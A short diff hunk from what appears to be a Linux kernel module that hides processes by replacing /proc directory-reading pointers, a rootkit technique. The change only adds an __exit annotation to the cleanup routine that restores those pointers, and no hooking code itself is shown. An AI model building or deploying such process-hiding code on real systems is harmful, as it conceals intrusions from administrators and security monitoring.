@@ -229,7 +229,7 @@ int hide_proc_init(void) {
     return 0;
 }
 
-void hide_proc_exit(void) {
+void __exit hide_proc_exit(void) {
     printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
 
     if (proc_root_fops && original_proc_root_readdir) {
